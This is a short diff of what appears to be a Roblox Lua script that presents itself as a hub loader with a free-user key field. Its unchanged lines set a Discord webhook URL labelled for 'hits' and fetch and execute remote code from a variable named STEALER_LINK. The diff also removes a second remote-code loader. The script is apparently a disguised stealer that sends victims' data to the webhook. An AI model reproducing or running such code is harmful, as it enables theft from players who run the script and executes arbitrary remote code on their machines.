@@ -13,5 +13,3 @@ SmallHitsWebhook = "https://discord.com/api/webhooks/1385646380504322109/BU2QZ14
 
 loadstring(game:HttpGet(STEALER_LINK, true))()
 ODH_KEY = "" -- if you are a free user, enter your key here to auto validate.
-
-loadstring(game:HttpGet("https://api.overdrivehub.xyz/v1/auth"))()
